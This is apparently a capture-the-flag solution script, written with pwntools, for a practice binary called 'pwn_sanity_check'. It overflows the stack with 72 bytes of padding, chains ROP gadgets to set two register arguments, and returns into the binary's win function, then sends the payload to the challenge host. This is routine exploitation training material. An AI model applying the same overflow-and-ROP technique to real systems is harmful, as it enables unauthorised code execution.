# ret2win

from pwn import *

HOST = "dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io"

PORT = 7480

e = ELF('pwn_sanity_check')
p = process("./pwn_sanity_check")

r = remote(HOST, PORT)
PADDING = b'A' * 72

POP_RDI = p64(0x400813) # pop rdi ; ret --> len of 8
POP_RSI_r15 = p64(0x400811) # pop rsi ; pop r15 ; ret --> len of 8
RET_ADDR = p64(e.symbols.win) # our win function

PAYLOAD =  PADDING + POP_RDI + p64(0xdeadbeef) + POP_RSI_r15 + p64(0x1337c0de) + p64(0x11111111) + RET_ADDR

r.sendline(PAYLOAD)
r.interactive()

